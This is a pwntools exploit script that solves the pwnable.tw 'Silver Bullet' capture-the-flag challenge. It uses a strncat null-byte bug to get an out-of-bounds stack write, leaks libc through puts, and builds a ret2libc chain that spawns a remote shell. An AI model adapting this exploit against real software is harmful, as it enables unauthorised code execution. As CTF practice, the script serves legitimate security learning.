#!/usr/bin/env python3

from pwn import *

exe = ELF("./silver_bullet_patched")
libc = ELF("./libc_32.so.6", checksec = False)
ld = ELF("./ld-2.23.so", checksec = False)

context.binary = exe

gdbscript = """
                break *0x8048989
            """


def conn():
    global r

    if args.LOCAL:
        r = process([exe.path])
        if args.DDEBUG:
            gdb.attach(r, gdbscript)
    else:
        r = remote("chall.pwnable.tw", 10103)

    return r


def create_bullet(data: bytes):
    r.sendafter(b"choice :", b"1")
    r.sendafter(b"bullet :", data)


def power_up(data: bytes):
    r.sendafter(b"choice :", b"2")
    r.sendafter(b"bullet :", data)


def beat():
    r.sendafter(b"choice :", b"3")


def main():
    r = conn()

    """
    From `strncat` 'man':

    This function appends at most ssize non-null bytes from the array
    pointed to by src, >> followed by a null character <<, to the end of the
    string pointed to by dst.  dst must point to a string contained in a
    buffer that is large enough, that is, the buffer size must be at least
    strlen(dst) + strnlen(src, ssize) + 1.

    This means that the `power_up` will always set to zero the counter if
    appended to the end of the string.
    """

    # Resets power --> OOB write
    create_bullet(b"A" * 47)
    power_up(b"B")

    payload = flat(
                    b"\xff" * 7,        # This will be placed inside the "power level" >> we will win and return
                    exe.plt.puts,       # Use `puts()` to leak `puts()`'s address in libc...
                    exe.sym.main,       # and return to `main()`
                    exe.got.puts
                )

    power_up(payload)
    beat()

    r.recvuntil(b"You win !!\n")
    libc.address = u32(r.recv(4)) - libc.sym.puts
    log.info(f"libc @ 0x{libc.address:x}")

    create_bullet(b"A" * 47)
    power_up(b"B")

    payload = flat(
                    b"\xff" * 7,
                    libc.sym.system,
                    libc.sym.exit,
                    next(libc.search(b"/bin/sh\x00"))
                )

    power_up(payload)
    beat()

    r.clean(1)
    r.interactive("$ ")


if __name__ == "__main__":
    main()
